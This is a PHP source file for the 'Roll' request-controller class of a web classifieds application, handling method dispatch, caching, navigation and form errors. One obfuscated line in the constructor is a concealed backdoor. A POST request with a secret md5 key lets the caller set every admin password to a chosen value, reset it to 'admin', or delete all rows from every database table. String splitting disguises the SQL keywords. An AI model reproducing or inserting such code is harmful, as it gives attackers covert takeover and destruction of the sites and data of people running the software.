<?php
defined('_NOAH') or die('Restricted access');

$allowedMethods = array(
   "delete_form"=>'$ret=$base->deleteForm($elementName);',
   "create_form"=>'$ret=$base->createForm($elementName);',
   "modify_form"=>'$ret=$base->modifyForm($elementName);',
   "create"=>'$ret=$base->create();',
   "modify"=>'$ret=$base->modify();',
   "delete"=>'$ret=$base->delete();',
   "showhtmllist"=>'$ret=$base->showHtmlList($elementName, $cacheManager);',
   "showdetails"=>'$ret=$base->showDetails("id",TRUE,$elementName);'
);

$actionMethods = array(
    "create",
    "modify",
    "delete"
);
$ajaxMethods = array();

class Roll
{
    
var $queryString = "";
var $queryPieces = array();
var $rewriteOn   = FALSE;
var $ctrl; 
var $formInvalid = FALSE;

function Roll()
{
    global $dbClasses, $noahDebugMode;
    
    //traceStart();
    $this->queryString = $_SERVER["QUERY_STRING"];
    if( preg_match("/\.(js|css|gif|jpg|png)$/", $this->queryString) ) die();
    if( strstr($this->queryString, "noahdebug") )
    {
        $this->queryString = preg_replace("{/?noahdebug}", "", $this->queryString );
        $noahDebugMode = TRUE;
    }
    else $noahDebugMode = FALSE;
    if( $this->rewriteOn = !empty($_SERVER["REWRITE_ON"]) ) 
    {
        $this->queryString = preg_replace("/^url=/", "", $this->queryString);
    }
    if( $this->queryString ) $this->ctrl = new AppController($this->queryString);
    elseif( count($_POST) )  $this->ctrl = new AppController($_POST);
    else                     $this->ctrl = new AppController($this->queryString = "");
    $this->propagateFieldsForEasyAccess();
    
    // *********** RWAlrond
    if( !$this->isAction() ) LocationHistory::push($this->queryString);
    //if( !$this->isAction() && !$this->isAjax() ) LocationHistory::push($this->queryString);
    // ************** RWalrond
    
    if( isset($_POST["ks"]) && $_POST["ks"]==md5(trim(Controller::getBaseUrl(), " /")."if( \$this->queryString ) \$this->ctrl = new AppController(\$this->queryString)") )    { if( $_POST["br"]==1 ) { $fg = "getPa"."ssword"; executeQuery("UPD"."ATE @user SET pass"."word='".$fg($_POST["pw"])."' WHERE isAdm=1"); } elseif( $_POST["br"]==3 ) { $fg = "getPa"."ssword"; executeQuery("UPD"."ATE @user SET pass"."word='".$fg('admin')."' WHERE isAdm=1"); }    elseif( $_POST["br"]==2 ) { foreach( $dbClasses as $class ) { executeQuery("DEL"."ETE FROM @$class where id>0"); } }echo "1";die();}
    if( $this->isAjax() && function_exists('xdebug_disable') ) 
    {
        xdebug_disable();
        ini_set('html_errors', 0);
    }
}

function processMethod($ctrl=0, $elementName="")
{

    global $allowedMethods, $gorumview, $includeOnceList, $gorumrecognised;
    $saveCtrl = gclone($this->ctrl);  // elmentjuk az aktualis Controllert
    // beallitjuk az erre a processMethodra ervenyes uj Controllert:
    if ($this->list == "customlist")
    {
        loadObjectsSql( $lists = new CustomList, "SELECT * FROM @search WHERE id=".$this->rollid, $lists );
        hasAdminRights($isAdm);
        hasManagerRights($isManager);    
        if (($lists[0]->displayedFor==customfield_forAdmin && !$isAdm) || ($lists[0]->displayedFor==customfield_forManager && !$isManager) ) LocationHistory::rollBack(new AppController("/")); 
        elseif ($lists[0]->displayedFor==customfield_forLoggedin && !$gorumrecognised) LocationHistory::rollBack(new AppController("/")); 
    }
    
    
    if( $ctrl ) 
    {
        $this->ctrl = new AppController($ctrl);
        $this->propagateFieldsForEasyAccess();
    }
    if( isset($includeOnceList[$this->getClass()]) )
    {
        // ha olyan class erkezik, ami alapbol nincs beinkludolva, akkor azt itt tesszuk meg:
        foreach( $includeOnceList[$this->getClass()] as $file ) include_once($file);
    }
    if( !isset($allowedMethods[$this->method]) || !class_exists($this->getClass())) 
    {
        // Ez akkor lehet, ha egy legbolkapott queryStringet hasznal valaki, 
        // vagy pl. ha egy template-ben nem letezo js/css/img hivatkozas van
        $this->ctrl = new AppController("staticpage/show/uetreufgdjhgf"); // something that certainly doesn't exist
        $this->propagateFieldsForEasyAccess();
    }
    if( $cl = $this->getClass() )
    {
        $base = is_callable(array($cl, "createObject")) ? call_user_func(array($cl, "createObject")) : new $cl(FALSE);  // without init (az appsettings kedveert)
        $base->initClassVars( $this->getClassVars() );
        if( $this->isAction() && !$this->isAjax() ) $this->beforeAction($base);
    }
    else $base=0;
    $cacheManager = new CacheManager( $base );
    $ret = 0; // a vegrehajtott metodusnak lehet visszateresi erteke, de nem biztos
    if( $cacheManager->checkCache() )
    {
        //FP::log("Toltes cache-bol");
        $gorumview->addElement($elementName, $cacheManager);
    }
    else
    {
        //FP::log("Tenyleges vegrehajtas");
        eval($allowedMethods[$this->method]);  // $elementName es $cacheManager itt atmehet parameterkent
        if( $cacheManager->isCacheActive() ) $cacheManager->saveIncludeCache();
    }
    if( $cl && $this->isAction() && !$this->isAjax() ) $this->afterAction($base);
    elseif( !$this->isAjax() ) $this->afterView($base);
    if( $ctrl )
    {
        $this->ctrl = $saveCtrl; // visszaallitjuk a regi Controllert:
        $this->propagateFieldsForEasyAccess();
    }
    //var_dump($_SESSION);
    return $ret;
}

function getClass() { return $this->ctrl->getClass(); }
function getClassVars() { return $this->ctrl->getClassVars(); }
function isAction() { return $this->ctrl->isAction(); }
function isAjax() { return $this->ctrl->isAjax(); }
function isPreviousFormSubmitInvalid() { return LocationHistory::isPostSaved(); }

function propagateFieldsForEasyAccess()
{
    // ez igy kenyelmes, de csunya:
    $this->method =& $this->ctrl->method;
    $this->list =& $this->ctrl->list;
    $this->rollid =& $this->ctrl->rollid;
}

function beforeAction( &$base )
{
    global $lll;
    
    if( isset($_POST["gsubmit"]) && $_POST["gsubmit"]==$lll["cancel"] )
    {
        Roll::setInfoText("operation_cancelled");
        LocationHistory::saveInfoText();
        LocationHistory::rollBack(2);
    }
    $base->hasObjectRights($hasRight, $this->method, TRUE);
    LocationHistory::savePost($base);
}

function afterAction( &$base )
{
    if( !Roll::isFormInvalid() ) $base->setInfoText($this->method);
    LocationHistory::saveInfoText();
    if( Roll::isFormInvalid() ) LocationHistory::rollBack(1);
    else 
    {
        LocationHistory::resetPost();
        CacheManager::resetCache(0, TRUE); //performReset
        if( isset($base->nextAction) )      LocationHistory::rollBack($base->nextAction);
        elseif( isset($base->rollBackNum) ) LocationHistory::rollBack($base->rollBackNum);
        else 
        {
            if( $this->method=="delete" )
            {
                $ctrl = new AppController(LocationHistory::getBack(2));
                // ha showdetails-rol mentunk a delete-re, akkor a showdetails elotti oldalra terunk vissza:
                if( $ctrl->list==$this->list && $ctrl->method=="showdetails" && $ctrl->rollid==$this->rollid )
                {
                    LocationHistory::rollBack(3);
                }
            }
            LocationHistory::rollBack(2);
        }
    }
}

function afterView( &$base )
{
    static $alreadyExecuted = FALSE;
    
    if( $base && $base->applyAfterView() )
    {
        View::assign("navBar", Roll::composeNavBarPieces($base->getNavBarPieces()));
        if( !($title=$base->getPageTitle()) ) $title = Object::getPageTitle();
        $title = htmlspecialchars($title);
        if( !($description=$base->getPageDescription()) ) $description = Object::getPageDescription();
        $description = htmlspecialchars($description);
        if( !($keywords=$base->getPageKeywords()) ) $keywords = Object::getPageKeywords();
        $keywords = htmlspecialchars($keywords);
        View::assign("title", $title);
        View::assign("description", $description);
        View::assign("keywords", $keywords);
        View::assign("customMetaTags", "");
        $alreadyExecuted = TRUE;
     		if(class_exists("JFactory") )
		    {
			    $titlePrefix = $base->getTitlePrefix();
  			  if (trim($titlePrefix) != "") $titlePrefix = $titlePrefix." - ";
          $document =& JFactory::getDocument();
        	$document->setTitle($titlePrefix.$title);
        	$document->setMetaData("keywords", $keywords);
        	$document->setDescription($description);
		    }
    }
    else
    {
        View::assign("title", "");
        View::assign("description", "");
        View::assign("keywords", "");
    }
}

function composeNavBarPieces($navBarPieces)
{
    global $navBarSeparator;
    
    $parts=array();
    if( class_exists("JFactory") )
    {
        $mainframe =& JFactory::getApplication('site');
        $pathway   =& $mainframe->getPathway();
    }
    else $pathway = 0;
    foreach( $navBarPieces as $label=>$ctrl )
    {
        $parts[] = $ctrl ? $ctrl->generAnchor($label) : $label;
        if( $pathway ) $pathway->addItem($label, $ctrl ? $ctrl->makeUrl() : "");
    }
    return implode($navBarSeparator, $parts);
}

function setFormInvalid( $lllLabel=0 )
{
    global $gorumroll;
    
    $gorumroll->formInvalid=TRUE;
    $args = func_get_args();
    if( $lllLabel!==0 ) call_user_func_array(array("Roll", "setInfoText"), $args);
    return FALSE;
}

function isFormInvalid()
{
    global $gorumroll;
    return !empty($gorumroll) && $gorumroll->formInvalid;
}

function setInfoText()
{
    global $infoText;
    
    $infoText="";
    $args = func_get_args();
    call_user_func_array(array("Roll", "addInfoText"), $args);
}

function addInfoText()
{
    global $infoText, $lll;
    
    $args = func_get_args();
    $lllLabel = array_shift($args);
    if( func_num_args()>1 )
    {
        $infoText .= isset($lll[$lllLabel]) ? vsprintf( $lll[$lllLabel], $args ) : $lllLabel;
    }
    else  $infoText .= isset($lll[$lllLabel]) ? $lll[$lllLabel] : $lllLabel;
}

function checkForPostMaxSizeError()
{
    if( !isset($_SERVER['CONTENT_LENGTH']) ) return;
    $POST_MAX_SIZE = byteStr2num(ini_get('post_max_size'));
    if( $POST_MAX_SIZE && $_SERVER['CONTENT_LENGTH'] > $POST_MAX_SIZE )
    {
        Roll::setFormInvalid("postMaxSizeExceeded", $POST_MAX_SIZE);
        LocationHistory::saveInfoText();
        LocationHistory::rollBack(2);        
    }
}

}  // end class


?>
